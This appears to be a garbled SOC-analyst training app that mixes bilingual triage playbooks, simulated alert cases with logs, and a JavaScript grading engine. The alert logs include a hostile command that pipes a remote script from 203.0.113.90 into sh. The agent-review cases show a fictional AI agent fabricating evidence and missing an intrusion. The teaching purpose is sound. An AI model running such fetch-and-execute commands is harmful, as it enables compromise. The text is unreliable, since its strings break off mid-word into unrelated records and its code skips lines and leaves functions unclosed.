envío es el habitual.","en":"A supplier changes mail server and its SPF fails, but DKIM and DMARC pass and the sending is as usual."},{"es":"Un boletín interno aprobado que la regla toma por envío masivo sospechoso.","en":"An approved internal newsletter that the rule mistakes for suspicious bulk sending."}],"analisis":[{"es":"¿El adjunto llegó a ejecutarse? Busca un proceso de Office que lanza un intérprete.","en":"Did the attachment run? Look for an Office process launching an interpreter."},{"es":"¿Hubo inicio de sesión en el buzón desde una IP extraña antes de crear la regla?","en":"Was there a sign-in to the mailbox from an odd IP before the rule was created?"},{"es":"¿Qué permisos pide la aplicación (leer todo el correo, enviar en nombre de)?","en":"What permissions does the app ask for (read all mail, send on behalf of)?"}],"respuesta":[{"si":{"es":"Alguien abrió el adjunto, introdujo credenciales o aceptó la aplicación","en":"Someone opened the attachment, entered credentials or accepted the app"},"accion":"contener","porque":{"es":"Ya hay compromiso: revoca sesiones y consentimientos, aísla el equipo, purga el correo de todos los buzones y escala.","en":"There is already a compromise: revoke sessions and consents, isolate the host, purge the email from every mailbox and escalate."}},{"si":{"es":"Hay una regla que reenvía el correo a un dominio externo","en":"There is a rule forwarding mail to an external domain"},"accion":"contener","porque":{"es":"Los datos están saliendo mientras lees esto: elimina la regla, revoca la sesión y escala.","en":"Data is leaving while you read this: remove the rule, revoke the session and escalate."}},{"si":{"es":"Se pide dinero o datos con urgencia en nombre de un directivo","en":"Money or data is urgently requested on behalf of an executive"},"accion":"escalar","porque":{"es":"Lo urgente no es técnico: que Finanzas pare la operación por teléfono. Escala ya y bloquea el dominio.","en":"The urgent part is not technical: Finance must stop the payment by phone. Escalate now and block the domain."}},{"si":{"es":"La autenticación falla por un error de configuración de un remitente conocido","en":"Authentication fails because of a known sender's misconfiguration"},"accion":"cerrar","porque":{"es":"Benigno: cierra y avisa al remitente para que lo corrija.","en":"Benign: close and tell the sender to fix it."}}],"casos":["T2-01","T2-02","T2-03","T2-05","T2-06","T2-07","T2-08"]},{"id":"equipos","icono":"terminal","titulo":{"es":"Equipos y procesos","en":"Endpoints and processes"},"que":{"es":"Antivirus y EDR: PowerShell, binarios del sistema usados para descargar, tareas programadas, cuentas nuevas y cifrado de ficheros. Aquí manda el árbol de procesos: quién lanzó qué.","en":"Antivirus and EDR: PowerShell, system binaries used to download, scheduled tasks, new accounts and file encryption. The process tree rules here: who launched what."},"triaje":[{"es":"Lee el proceso padre y el hijo: Office, un navegador o un servicio que lanza un intérprete es raro.","en":"Read the parent and child process: Office, a browser or a service launching an interpreter is odd."},{"es":"Decodifica lo codificado (Base64) antes de opinar.","en":"Decode anything encoded (Base64) before judging."},{"es":"Comprueba la firma, la ruta y el hash del binario.","en":"Check the binary's signature, path and hash."},{"es":"¿Hay un cambio aprobado o una herramienta de administración conocida detrás?","en":"Is there an approved change or a known admin tool behind it?"}],"fp":[{"es":"Detección heurística de baja confianza sobre un binario firmado, en su ruta estándar y muy extendido.","en":"A low-confidence heuristic hit on a signed, widely used binary in its standard path."},{"es":"Ficheros de prueba de antivirus (EICAR) documentados en una incidencia.","en":"Antivirus test files (EICAR) documented in a ticket."},{"es":"Herramientas de administración (PsExec) usadas por el equipo de sistemas en una ventana aprobada.","en":"Admin tools (PsExec) used by the systems team in an approved window."}],"analisis":[{"es":"¿Qué descargó o ejecutó después? Sigue las conexiones salientes del equipo.","en":"What did it download or run next? Follow the host's outbound connections."},{"es":"¿Se creó persistencia (tarea, servicio, cuenta, clave de registro)?","en":"Was persistence created (task, service, account, registry key)?"},{"es":"¿Hay renombrado o borrado masivo de ficheros o de copias de seguridad?","en":"Is there mass renaming or deletion of files or backups?"}],"respuesta":[{"si":{"es":"Se ejecuta código malicioso, hay persistencia de un atacante o se cifran ficheros","en":"Malicious code runs, there is attacker persistence or files are being encrypted"},"accion":"contener","porque":{"es":"Aísla el equipo ya: cada minuto son más ficheros o más movimiento lateral. Después, escala con el árbol de procesos.","en":"Isolate the host now: every minute means more files or more lateral movement. Then escalate with the process tree."}},{"si":{"es":"Una cuenta de la casa hace un cambio sospechoso sin autorización y no sabes si es ella o un atacante","en":"An internal account makes a suspicious unauthorised change and you cannot tell whether it is them or an attacker"},"accion":"escalar","porque":{"es":"Hace falta saber si la sesión está comprometida antes de actuar sobre una persona: escala con prioridad alta.","en":"You need to know whether the session is compromised before acting on a person: escalate with high priority."}},{"si":{"es":"El antivirus ya bloqueó o puso en cuarentena algo documentado como prueba","en":"The antivirus already blocked or quarantined something documented as a test"},"accion":"cerrar","porque":{"es":"La regla funcionó y la actividad es legítima: benigno, citando la incidencia.","en":"The rule worked and the activity is legitimate: benign, quoting the ticket."}}],"casos":["T1-03","T1-04","T3-01","T3-02","T3-03","T3-05","T3-06","T3-07"]},{"id":"red","icono":"server","titulo":{"es":"Red y perímetro","en":"Network and perimeter"},"que":{"es":"Escaneos, balizas hacia un C2, listas de reputación y minería. En red, el patrón importa más que una conexión suelta: intervalos, volúmenes y destinos.","en":"Scans, C2 beacons, reputation lists and mining. On the network, the pattern matters more than a single connection: intervals, volumes and destinations."},"triaje":[{"es":"¿Qué puertos respondieron? Que respondan los que son públicos a propósito no es una brecha.","en":"Which ports answered? Ports that are public on purpose answering is not a breach."},{"es":"Mide el intervalo entre conexiones: un latido regular es una baliza, no una persona.","en":"Measure the interval between connections: a regular heartbeat is a beacon, not a person."},{"es":"Comprueba el protocolo y el puerto contra lo que hace ese servidor normalmente.","en":"Check protocol and port against what that server normally does."},{"es":"¿La IP entró hoy en una lista de reputación? Las listas también se equivocan.","en":"Did the IP join a reputation list today? Lists make mistakes too."}],"fp":[{"es":"Una fuente de inteligencia que mete por error una IP legítima (por ejemplo, un servidor de hora).","en":"A threat intel feed that wrongly adds a legitimate IP (for example a time server)."},{"es":"El escaneo trimestral de vulnerabilidades desde el origen y en la ventana aprobados.","en":"The quarterly vulnerability scan from the approved source and window."}],"analisis":[{"es":"¿Qué proceso del equipo abre las conexiones?","en":"Which process on the host opens the connections?"},{"es":"¿Hay tráfico de aplicación después del escaneo o solo sondeos?","en":"Is there application traffic after the scan or only probes?"},{"es":"¿Sube la CPU o el consumo a la vez que las conexiones?","en":"Does CPU or consumption rise along with the connections?"}],"respuesta":[{"si":{"es":"Un equipo interno habla con un C2 o con un pool de minería","en":"An internal host talks to a C2 or a mining pool"},"accion":"contener","porque":{"es":"El equipo está comprometido: aíslalo, bloquea el destino y escala para buscar cómo entró.","en":"The host is compromised: isolate it, block the destination and escalate to find how it got in."}},{"si":{"es":"Un escaneo desde Internet solo encuentra los puertos públicos y no hay tráfico después","en":"An Internet scan only finds the public ports and nothing follows"},"accion":"cerrar","porque":{"es":"Es ruido de fondo de Internet: verdadero positivo documentado y cerrado.","en":"It is Internet background noise: a documented and closed true positive."}},{"si":{"es":"El escaneo o la conexión coinciden con un cambio o la lista se equivocó","en":"The scan or connection matches a change, or the list was wrong"},"accion":"cerrar","porque":{"es":"Benigno o falso positivo: cierra y, si es la lista, propón excluir la IP.","en":"Benign or false positive: close and, if it is the list, propose excluding the IP."}}],"casos":["T1-02","T4-03","T4-04","T4-07","T4-08"]},{"id":"web","icono":"flag","titulo":{"es":"Aplicaciones web","en":"Web applications"},"que":{"es":"Inyección SQL, ejecución de comandos y web shells. El código de respuesta HTTP es tu mejor amigo: dice si el ataque llegó o no.","en":"SQL injection, command execution and web shells. The HTTP status code is your best friend: it tells you whether the attack got through."},"triaje":[{"es":"Mira el código de respuesta de cada petición: 403 bloqueada, 200 servida.","en":"Check the status code of every request: 403 blocked, 200 served."},{"es":"Lee el User-Agent: muchas herramientas automáticas de ataque se anuncian en él.","en":"Read the User-Agent: many automated attack tools announce themselves there."},{"es":"Busca parámetros con comandos del sistema (whoami, id, cmd=).","en":"Look for parameters carrying system commands (whoami, id, cmd=)."},{"es":"¿El servidor web lanzó procesos o abrió conexiones salientes?","en":"Did the web server launch processes or open outbound connections?"}],"fp":[{"es":"Peticiones legítimas con caracteres que parecen SQL (apellidos con apóstrofo, búsquedas).","en":"Legitimate requests with SQL-like characters (surnames with apostrophes, searches)."}],"analisis":[{"es":"¿Alguna petición maliciosa recibió un 200?","en":"Did any malicious request get a 200?"},{"es":"¿Aparece un fichero nuevo en el directorio web?","en":"Does a new file appear in the web directory?"},{"es":"¿El proceso del servidor web lanza un intérprete de comandos?","en":"Does the web server process launch a command interpreter?"}],"respuesta":[{"si":{"es":"Hay ejecución de comandos, un fichero nuevo en el directorio web o procesos hijos del servidor","en":"There is command execution, a new file in the web directory or child processes of the server"},"accion":"contener","porque":{"es":"El atacante ya está dentro del servidor: aíslalo o sácalo de servicio y escala.","en":"The attacker is already inside the server: isolate it or take it out of service and escalate."}},{"si":{"es":"Todas las peticiones maliciosas reciben un 403 y no hay nada después","en":"Every malicious request gets a 403 and nothing follows"},"accion":"cerrar","porque":{"es":"El control funcionó: verdadero positivo documentado. Un solo 200 cambiaría la decisión.","en":"The control worked: a documented true positive. A single 200 would change the decision."}}],"casos":["T4-01","T4-02"]},{"id":"datos","icono":"upload","titulo":{"es":"Fuga de datos","en":"Data leakage"},"que":{"es":"USB, subidas a la nube personal y DNS anómalo. Aquí a menudo hay una persona de la casa detrás, y eso cambia quién decide.","en":"USB, uploads to personal cloud and anomalous DNS. There is often a person from the company behind it, and that changes who decides."},"triaje":[{"es":"¿Qué datos son? Nóminas, clientes, DNI o IBAN son datos personales.","en":"What data is it? Payroll, customers, ID numbers or IBANs are personal data."},{"es":"¿Cuánto volumen y a dónde va: USB, nube personal, un dominio raro?","en":"How much volume and where to: USB, personal cloud, an odd domain?"},{"es":"¿La persona tiene una razón de trabajo o una petición aprobada?","en":"Does the person have a work reason or an approved request?"},{"es":"En DNS, mira la longitud y la forma de los subdominios: datos codificados no parecen nombres.","en":"In DNS, check the length and shape of subdomains: encoded data does not look like names."}],"fp":[{"es":"Copias de seguridad o migraciones aprobadas que mueven mucho volumen.","en":"Approved backups or migrations moving a lot of volume."}],"analisis":[{"es":"¿Hay contexto de RR. HH. (baja, cambio de puesto, accesos temporales sin retirar)?","en":"Is there HR context (leaving, role change, temporary access never removed)?"},{"es":"¿Las consultas DNS salen de un proceso o equipo comprometido?","en":"Do the DNS queries come from a compromised process or host?"},{"es":"¿Se repite el comportamiento en otros días?","en":"Does the behaviour repeat on other days?"}],"respuesta":[{"si":{"es":"Una persona de la empresa saca datos personales sin una petición que lo justifique","en":"A company employee takes personal data out without a request that justifies it"},"accion":"escalar","porque":{"es":"Implica a una persona, a RR. HH. y a protección de datos. Un N1 no contiene ni contacta a la persona por su cuenta: escala con todas las evidencias.","en":"It involves a person, HR and data protection. T1 does not contain or contact the person alone: escalate with all the evidence."}},{"si":{"es":"Los datos salen por un canal técnico (DNS, C2) desde un equipo comprometido","en":"Data leaves through a technical channel (DNS, C2) from a compromised host"},"accion":"contener","porque":{"es":"Es un atacante, no una persona: aísla el equipo y bloquea el destino ya.","en":"It is an a pped the business over authorised work. Benign: close quoting the change."}},{"id":"R-03","hora":"08:05","sev":"baja","fuente":"Firewall","regla":{"es":"Escaneo de puertos desde Internet","en":"Port scan from the Internet"},"titulo":{"es":"Una IP externa sondea decenas de puertos","en":"An external IP probes dozens of ports"},"resumen":{"es":"El cortafuegos cuenta más de 300 conexiones bloqueadas desde un mismo origen en dos minutos.","en":"The firewall counts more than 300 blocked connections from one source in two minutes."},"logs":[["07:58:10","fw01","DENY tcp 198.51.100.77 -> 192.0.2.10 ports=1-1024 count=312 (2m)"],["07:59:40","fw01","ALLOW tcp 198.51.100.77:51544 -> 192.0.2.10:2222 nat=10.20.0.30:22"],["08:00:02","win-SRV-SQL01","sshd Accepted password for svc_admin from 198.51.100.77 port 51544"],["08:01:30","edr","process host=SRV-SQL01 user=svc_admin parent=sshd cmd=\"curl -s http://203.0.113.90/k.sh | sh\""]],"ruido":{"fuentes":["fw","proxy"],"n":8},"veredicto":"vp","accion":"contener","agente":{"veredicto":"vp","accion":"cerrar","confianza":88,"razonamiento":{"es":"Reconocimiento automático desde Internet: el cortafuegos bloqueó las 312 conexiones. Es ruido de fondo habitual. Se documenta y se cierra.","en":"Automated reconnaissance from the Internet: the firewall blocked all 312 connections. It is usual background noise. Document and close."},"comprobaciones":[{"es":"Acción del cortafuegos sobre el escaneo","en":"Firewall action on the scan"},{"es":"Reputación del origen","en":"Source reputation"}],"cita":"count=312"},"error":"omision","explica":{"es":"El agente solo leyó la primera línea. Justo después, el mismo origen entra por un puerto SSH publicado por error (2222 hacia SRV-SQL01:22), inicia sesión con svc_admin y descarga y ejecuta un script. El escaneo ya no es ruido: es una intrusión. Aislar SRV-SQL01, deshabilitar svc_admin, cerrar la regla de NAT y escalar.","en":"The agent only read the first line. Right after, the same source gets in through mando que, decodificado, descarga y ejecuta código de 203.0.113.55, y una conexión que vuelve cada 60 segundos: una baliza. Revisar que lo que cita el agente exista de verdad es lo primero. Aislar PC-ALM-021, bloquear la IP y escalar.","en":"The agent made up the evidence: INV-2231 appears nowhere in the logs and the EDR says signed=false. What is there is a command that, decoded, downloads and runs code from 203.0.113.55, and a connection that comes back every 60 seconds: a beacon. Checking that what the agent cites really exists comes first. Isolate PC-ALM-021, block the IP and escalate."}},{"id":"R-05","hora":"09:10","sev":"media","fuente":"SIEM","regla":{"es":"Muchas conexiones internas a puertos de administración","en":"Many internal connections to admin ports"},"titulo":{"es":"SCAN-01 recorre los servidores por SMB, RDP y SSH","en":"SCAN-01 sweeps the servers over SMB, RDP and SSH"},"resumen":{"es":"Un mismo origen interno abre conexiones a los puertos 22, 445 y 3389 de todos los servidores.","en":"One internal source opens connections to ports 22, 445 and 3389 on every server."},"logs":[["08:55:00","itsm","CHG-2120 approved owner=adm.rvela window=09:00-11:00 source=10.20.5.15 desc=\"Escaneo mensual de vulnerabilidades autenticado\""],["09:01:12","fw01","ALLOW tcp 10.20.5.15 -> 10.20.0.0/24 ports=22,445,3389 count=96"],["09:02:40","win-SRV-DC01","EventID=4624 LogonType=3 TargetUserName=svc_scan IpAddress=10.20.5.15 WorkstationName=SCAN-01"],["09:05:18","win-SRV-FS01","EventID=4624 LogonType=3 TargetUserName=svc_scan IpAddress=10.20.5.15 WorkstationName=SCAN-01"]],"ruido":{"fuentes":["win","fw","dc"],"n":6},"veredicto":"benigno","accion":"cerrar","agente":{"veredicto":"benigno","accion":"cerrar","confianza":95,"razonamiento":{"es":"El origen es SCAN-01, la cuenta es svc_scan y todo ocurre dentro de la ventana del cambio CHG-2120 aprobado para el escaneo mensual. Benigno: se cierra citando el cambio.","en":"The source is SCAN-01, the account is svc_scan and everything happens within the window of change CHG-2120, approved for the monthly scan. Benign: close quoting the change."},"comprobaciones":[{"es":"Cambio aprobado: origen, ventana y responsable","en":"Approved change: source, window and owner"},{"es":"Cuenta usada en los inicios de sesión","en":"Account used for the sign-ins"}],"cita":"CHG-2120"},"error":null,"explica":{"es":"Veredicto correcto y bien razonado: origen, cuenta y ventana coinciden con un cambio aprobado. Aprobarlo rápido también cuenta: el revisor no está para desconfiar de todo, sino para encontrar lo que el agente no vio.","en":"Correct and well-reasoned verdict: source, account and window match an approved change. Approving it quickly counts too: the reviewer is not there to distrust everything, but to find what the agent missed."}},{"id":"R-06","hora":"09:47","sev":"alta","fuente":"Microsoft 365","regla":{"es":"Descarga masiva desde SharePoint","en":"Mass download from SharePoint"},"titulo":{"es":"Una persona de Finanzas descarga 2 300 documentos en diez minutos","en":"A Finance employee downloads 2,300 documents in ten minutes"},"resumen":{"es":"La regla salta con más de 500 descargas por hora de una misma cuenta.","en":"The rule fires on more than 500 downloads per hour from one account."},"logs":[["09:31:02","entra","signin OK user=m.ortega ip=10.20.3.33 device=PC-FIN-003 compliant=true mfa=satisfied"],["09:35:10","m365","FileDownloaded user=m.ortega site=/sites/Finanzas/Contratos count=2312 (10m) client=OneDrive sync"],["09:44:51","m365","FileUploaded user=m.ortega target=personal-drive.example/m.ortega count=640"],["09:45:30","rrhh","m.ortega notice_period=true last_day=2026-11-20"]],"ruido":{"fuentes":["entra","proxy","win"],"n":6},"veredicto":"vp","accion":"escalar","agente":{"veredicto":"vp","accion":"contener","confianza":87,"razonamiento":{"es":"Exfiltración de contratos a un almacenamiento personal. Recomiendo deshabilitar ya la cuenta de m.ortega, bloquear PC-FIN-003 y avisarle de que su acceso queda suspendido.","en":"Exfiltration of contracts to personal storage. I recommend disabling m.ortega's account now, blocking PC-FIN-003 and telling her that her access is suspended."},"comprobaciones":[{"es":"Volumen de descargas","en":"Download volume"},{"es":"Destino de las subidas","en":"Upload destination"}],"cita":"personal-drive.example"},"error":"persona","explica":{"es":"El veredicto es correcto, la acción no. No hay ningún indicio de compromiso: entra desde su equipo, con MFA y en la oficina. Es una persona de la casa que se va el día 20, y eso implica a RR. HH., a asesoría jurídica y a protección de datos. Un N1 no deshabilita la cuenta ni avisa a la persona por su cuenta: puede alertarla y destruir pruebas. Se escala con todas las evidencias.","en":"The verdict is right, the action is not. There is no sign of compromise: she signs in from her own PC, with MFA, in the office. She is an employee leaving on the 20th, which involves HR, legal and data protection. T1 does not disable the account or warn the person alone: it can tip her off and destroy evidence. Escalate with all the evidence."}},{"id":"R-07","hora":"10:20","sev":"media","fuente":"Threat intel","regla":{"es":"Conexión a IP con mala reputación","en":"Connection to a bad-reputation IP"},"titulo":{"es":"Varios equipos se conectan a una IP con puntuación de riesgo 95","en":"Several hosts connect to an IP with risk score 95"},"resumen":{"es":"La fuente de inteligencia marca la IP como maliciosa desde esta mañana.","en":"The threat intel feed has flagged the IP as malicious since this morning."},"logs":[["10:02:11","ti","indicator ip=198.51.100.140 score=95 first_seen=2026-11-09 tags=\"shared hosting\" source=feed-abierta"],["10:05:44","proxy01","GET https://updates.impresoras.example/firmware/manifest.json user=svc_print src=10.20.0.50 status=200 resolved=198.51.100.140"],["10:05:47","proxy01","GET https://updates.impresoras.example/firmware/fw-4.2.1.bin user=svc_print src=10.20.0.50 statu /* Blue-Jr · motor

const BJ = (() => {
  'use strict';

  /* ---------- Constantes (la ayuda y el README se generan o se comprueban contra ellas) ---------- */
  const PESOS = Object.freeze({ veredicto: 40, accion: 25, campos: 25, ticket: 10 });

  /* ---------- Corrección ---------- */

  function clavesEn(caso, texto) {

  /**
   * Corrige un ticket. Devuelve la nota (0-100), el detalle por criterio y lo esperado.
   * Ticket: la mitad de los puntos por llegar a TICKET_MIN caracteres y la otra mitad por citar

    const citas = claves.filter((k) => k.ok).length >= necesarias;

      { id: 'ticket', peso: PESOS.ticket, puntos: (largo ? PESOS.ticket / 2 : 0) + (citas ? PESOS.ticket / 2 : 0), largo, citas, claves, necesarias }
    ];

    return { id: caso.id, nota, criterios, apto: nota >= UMBRAL_APTO };

    const media = hechos ? Math.round(notas.reduce((s, n) => s + n, 0) / hechos) : 0;
    const veredictos = turno.casos.filter((c) => respuestas[c.id]?.nota !== undefined && respuestas[c.id]?.veredicto === c.veredicto).length;

  function historial(turnos, respuestas = {}) {
    const casos = turnos.flatMap((t) => t.casos);

    const comp = Object.fromEntries(COMPETENCIAS.map((k) => [k, { casos: 0, puntos: 0 }]));
    for (const c of hechos) for (const k of c.competencias) if (comp[k]) { comp[k].casos++; comp[k].puntos += respuestas[c.id].nota; }

      tickets: hechos.length,
      total: casos.length,
      media: hechos.length ? Math.round(hechos.reduce((s, c) => s + respuestas[c.id].nota, 0) / hechos.length) : 0,
      precisionVeredicto: hechos.length ? Math.round((bien('veredicto') / hechos.length) * 100) : 0,
      precisionAccion: hechos.length ? Math.round((bien('accion') / hechos.length) * 100) : 0,

      cerradosPorError: hechos.filter((c) => c.accion !== 'cerrar' && respuestas[c.id].accion === 'cerrar').length,

    for (const [id, t] of Object.entries(rel)) if (/^T[1-9]$/.test(id) && typeof t === 'string') out.relevos[id] = corta(t, LIMITES.relevo);
    const obj = (x) => (x && typeof x === 'object' && !Array.isArray(x) ? x : {});
    const fecha = (x) => typeof x === 'string' && /^\d{4}-\d{2}-\d{2}$/.test(x) && !Number.isNaN(Date.parse(x));
    for (const [id, r] of Object.entries(obj(bruto.revisiones))) {
      const item = indiceRev[id];
      if (!item || !r || typeof r !== 'object') continue;
      const limpio = {
        dictamen: DICTAMENES.includes(r.dictamen) ? r.dictamen : null,
        motivo: ERRORES_IA.includes(r.motivo) ? r.motivo : null,
        accion: ACCIONES.includes(r.accion) ? r.accion : null,
        cuando: typeof r.cuando === 'string' && !Number.isNaN(Date.parse(r.cuando)) ? r.cuando : null
      };
      // La nota se recalcula siempre: una copia no puede traer una revisión aprobada a mano.
      if (r.cerrado === true && limpio.dictamen) { limpio.cerrado = true; limpio.nota = corregirRevision(item, limpio).nota; }
      out.revisiones[id] = limpio;
    }
    for (const [id, e] of Object.entries(obj(bruto.repaso))) {
      if (!indice[id] || !e || !Number.isInteger(e.caja) || e.caja < 0 || e.caja >= CAJAS.length || !fecha(e.proximo)) continue;
      out.repaso[id] = { caja: e.caja, proximo: e.proximo };
    }
    for (const [d, x] of Object.entries(obj(bruto.rapido)).slice(0, 400)) {
      if (!fecha(d) || !x || typeof x !== 'object') continue;
      const total = x.total, aciertos = x.aciertos, ms = x.ms;
      if (!Number.isInteger(total) || total < 1 || total > RAPIDO_N || !Number.isInteger(aciertos) || aciertos < 0 || aciertos > total) continue;
      out.rapido[d] = { aciertos, total, ms: Number.isInteger(ms) && ms >= 0 && ms <= 3600000 ? ms : 0 };
    }
    for (const [id, m] of Object.entries(obj(bruto.mensajes))) {
      const caso = indice[id];
      if (!caso || !m || typeof m !== 'object') continue;
      const limpio = {};
      for (const tipo of TIPOS_MENSAJE) if (typeof m[tipo] === 'string') limpio[tipo] = corta(m[tipo], LIMITES.ticket);
      // Si el mensaje está completo se recalcula aquí; una copia no puede traer «completo» sin el texto.
      limpio.ok = TIPOS_MENSAJE.filter((tipo) => limpio[tipo] && corregirMensaje(tipo, limpio[tipo], caso).completo);
      limpio.cuando = typeof m.cuando === 'string' && !Number.isNaN(Date.parse(m.cuando)) ? m.cuando : null;
      out.mensajes[id] = limpio;
    }
    for (const [id, lista] of Object.entries(obj(bruto.n2))) {
      const caso = indice[id];
      if (!caso || !Array.isArray(lista)) continue;
      const ids = camposDe(caso).map((c) => c.id);
      const vistas = new Set();
      out.n2[id] = [];
      for (const x of lista) {
        if (!x || !PREGUNTAS_N2.includes(x.tipo) || vistas.has(x.tipo)) continue;
        vistas.add(x.tipo);
        // Se guarda la respuesta tal como era al preguntar: preguntar no puede servir para probar respuestas gratis.
        if (x.tipo === 'decision') out.n2[id].push({ tipo: 'decision', v: x.v === true || x.v === false ? x.v : null });
        else if (x.tipo === 'falta') out.n2[id].push({ tipo: 'falta', campos: Array.isArray(x.campos) ? x.campos.filter((c) => ids.includes(c)) : [] });
        else out.n2[id].push({ tipo: 'inicio' });
      }
    }
    for (const [id, d] of Object.entries(obj(bruto.defensas))) {
      const caso = indice[id];
      const r = out.respuestas[id];
      // Solo hay entrevista de tickets cerrados, y las preguntas dependen de lo que se decidió.
      if (!caso || !r?.cerrado || !d || typeof d !== 'object') continue;
      const limpio = {};
      for (const p of preguntasDefensa(caso, r)) if (typeof d[p.id] === 'string') limpio[p.id] = corta(d[p.id], LIMITES.ticket);
      limpio.ok = preguntasDefensa(caso, r).filter((p) => limpio[p.id] && corregirDefensa(p, limpio[p.id], caso).completo).map((p) => p.id);
      limpio.cuando = typeof d.cuando === 'string' && !Number.isNaN(Date.parse(d.cuando)) ? d.cuando : null;
      out.defensas[id] = limpio;
    }
    return out;
  }

  /** Celda CSV a prueba de fórmulas (=, +, -, @, tabulador o retorno al inicio). */
  const celdaCsv = (v) => { let s = String(v ?? ''); if (/^[=+\-@\t\r]/.test(s)) s = "'" + s; return /[",\n;]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s; };

  /* ---------- Práctica: XP, racha, niveles e insignias ----------
   * Todo se deriva de los tickets cerrados (nota y fecha): no hay contador que guardar, inflar ni sanear. */
  const META_DIARIA = 150; // XP del día para cumplir la meta (unos dos tickets)
  const NIVELES = Object.freeze([
    { id: 'becario', xp: 0 }, { id: 'practicas', xp: 400 }, { id: 'n1', xp: 1200 }, { id: 'senior', xp: 2400 }, { id: 'n2', xp: 3400 }
  ]);
  const DIA_MS = 86400000;
  const diaIso = (d) => new Date(d).toISOString().slice(0, 10);
  const diaAntes = (iso, n = 1) => diaIso(Date.parse(iso + 'T00:00:00Z') - n * DIA_MS);

  function progreso(respuestas = {}, hoy = diaIso(Date.now())) {
    const cerradas = Object.values(respuestas).filter((r) => r && typeof r.nota === 'number');
    const xp = cerradas.reduce((a, r) => a + r.nota, 0);
    const porDia = {};
    for (const r of cerradas) if (r.cuando) { const d = r.cuando.slice(0, 10); porDia[d] = (porDia[d] || 0) + r.nota; }
    // La racha cuenta días seguidos con al menos un ticket; si hoy aún no hay, se mira desde ayer.
    let d = porDia[hoy] ? hoy : diaAntes(hoy), racha = 0;
    while (porDia[d] !== undefined) { racha++; d = diaAntes(d); }
    let i = 0;
    while (i + 1 < NIVELES.length && xp >= NIVELES[i + 1].xp) i++;
    const nivel = NIVELES[i], sig = NIVELES[i + 1] || null;
    return {
      xp, xpHoy: porDia[hoy] || 0, meta: META_DIARIA, racha, dias: Object.keys(porDia).length,
      nivel: nivel.id, nivelN: i + 1, siguiente: sig && sig.id, faltan: sig ? sig.xp - xp : 0,
      pctNivel: sig ? Math.round(((xp - nivel.xp) / (sig.xp - nivel.xp)) * 100) : 100
    };
  }

  function insignias(turnos, respuestas = {}, hoy, extra = {}) {
    const casos = turnos.flatMap((t) => t.casos);
    const hechos = casos.filter((c) => typeof respuestas[c.id]?.nota === 'number');
    const r = (c) => respuestas[c.id];
    const racha = Number.isInteger(extra.racha) ? extra.racha : progreso(respuestas, hoy).racha;
    const lista = [
      ['primer', hechos.length >= 1],
      ['perfecto', hechos.some((c) => r(c).nota === 100)],
      ['sin_alarma', hechos.filter((c) => c.veredicto !== 'vp' && r(c).veredicto === c.veredicto).length >= 3],
      ['contencion', hechos.filter((c) => c.accion === 'contener' && r(c).accion === 'contener').length >= 5],
      ['turno', turnos.some((t) => resumenTurno(t, respuestas).apto)],
      ['racha3', racha >= 3],
      ['revisor', (extra.cazados || 0) >= 3],
      ['rapido', extra.rapidoPerfecto === true],
      ['comunicador', (extra.mensajes || 0) >= 5],
      ['entrevista', (extra.defensas || 0) >= 3],
      ['semana', hechos.length === casos.length && casos.length > 0]
    ];
    return lista.map(([id, ok]) => ({ id, ok }));
  }

  /* ---------- Revisión del agente de IA (nivel 1,5) ----------
   * Un agente ya ha resuelto la alerta; el analista aprueba o rechaza su trabajo y, si lo rechaza,
   * dice qué falló y qué acción tocaba. */
  const ERRORES_IA = Object.freeze(['contexto', 'omision', 'alucinacion', 'persona', 'fuente']);
  const DICTAMENES = Object.freeze(['aprobar', 'rechazar']);
  const PESOS_REV = Object.freeze({ dictamen: 60, motivo: 25, accion: 15 });
  function corregirRevision(item, r = {}) {
    const bien = item.error === null;
    const dictamen = r.dictamen === (bien ? 'aprobar' : 'rechazar');
    // Si el agente acertó y se aprueba, no hay motivo ni acción que corregir: se dan por buenos.
    const motivo = bien ? dictamen : dictamen && r.motivo === item.error;
    const accion = bien ? dictamen : dictamen && r.accion === item.accion;
    const criterios = [
      { id: 'dictamen', peso: PESOS_REV.dictamen, puntos: dictamen ? PESOS_REV.dictamen : 0, esperado: bien ? 'aprobar' : 'rechazar', valor: r.dictamen ?? null },
      { id: 'motivo', peso: PESOS_REV.motivo, puntos: motivo ? PESOS_REV.motivo : 0, esperado: item.error, valor: r.motivo ?? null },
      { id: 'accion', peso: PESOS_REV.accion, puntos: accion ? PESOS_REV.accion : 0, esperado: item.accion, valor: r.accion ?? null }
    ];
    return { nota: criterios.reduce((a, c) => a + c.puntos, 0), criterios, cazado: !bien && dictamen };
  }

  /* ---------- Triaje rápido con repaso espaciado ----------
   * Lo que se falla vuelve mañana; lo que se acierta, cada vez más tarde (1, 2, 4, 7 y 14 días). */
  const CAJAS = Object.freeze([1, 2, 4, 7, 14]);
  const RAPIDO_N = 10;
  const XP_RAPIDO = 5; // XP por acierto en la primera ronda del día
  function repasar(entrada, acierto, hoy) {
    // Una alerta nueva acertada empieza en la segunda caja: solo lo fallado vuelve mañana.
    const caja = acierto ? Math.min((entrada && Number.isInteger(entrada.caja) ? entrada.caja : 0) + 1, CAJAS.length - 1) : 0;
    return { caja, proximo: diaAntes(hoy, -CAJAS[caja]) };
  }
  function sesionRapida(casos, respuestas = {}, repaso = {}, hoy, n = RAPIDO_N) {
    const cerrados = casos.filter((c) => typeof respuestas[c.id]?.nota === 'number');
    const r = azar(semilla('rapido-' + hoy));
    const mezcla = cerrados.map((c) => [r(), c]).sort((a, b) => a[0] - b[0]).map(([, c]) => c);
    const toca = (c) => repaso[c.id] && repaso[c.id].proximo <= hoy;
    const fallado = (c) => !repaso[c.id] && respuestas[c.id].accion !== c.accion;
    const nuevo = (c) => !repaso[c.id];
    const orden = [
      ...mezcla.filter(toca).sort((a, b) => repaso[a.id].proximo.localeCompare(repaso[b.id].proximo)),
      ...mezcla.filter((c) => fallado(c)),
      ...mezcla.filter((c) => nuevo(c) && !fallado(c)),
      ...mezcla.filter((c) => repaso[c.id] && !toca(c))
    ];
    return [...new Set(orden)].slice(0, n);
  }

  /* ---------- Comunicar: mensajes corregidos en local ----------
   * Dos mensajes por ticket cerrado: el escalado a N2 (técnico) y el aviso a dirección (llano).
   * Se corrigen con criterios comprobables, en español o en inglés; no valoran el estilo, sino que
   * estén las piezas que un N2 o una directora necesitan para actuar. */
  const TIPOS_MENSAJE = Object.freeze(['n2', 'dir']);
  const XP_MENSAJE = 10; // por cada mensaje que cumple todos los criterios
  const plano = (t) => String(t ?? '').normalize('NFD').replace(/[̀-ͯ]/g, '').toLowerCase();
  const RE = {
